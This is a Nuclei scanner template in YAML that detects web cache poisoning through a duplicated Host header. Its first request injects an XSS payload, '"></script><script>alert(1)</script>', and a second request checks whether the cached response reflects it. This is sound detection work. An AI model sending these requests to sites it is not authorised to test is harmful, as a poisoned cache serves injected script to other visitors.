http:
- matchers:
  - dsl:
    - contains(body_2, "<script>alert(1)</script>")
    type: dsl
  raw:
  - 'GET /?{{randstr}}=9 HTTP/1.1

    Host: {{Hostname}}

    HOST: 127.0.0.1"></script><script>alert(1)</script>

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101
    Firefox/105.0

    '
  - 'GET /?{{randstr}}=9 HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101
    Firefox/105.0

    '
  req-condition: true
  stop-at-first-match: true
id: cache-poisoning-via-host-2
info:
  author: reewardius
  name: Cache Poisoning via Host
  reference:
  - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
  - https://portswigger.net/research/practical-web-cache-poisoning
  severity: medium
  tags: cache
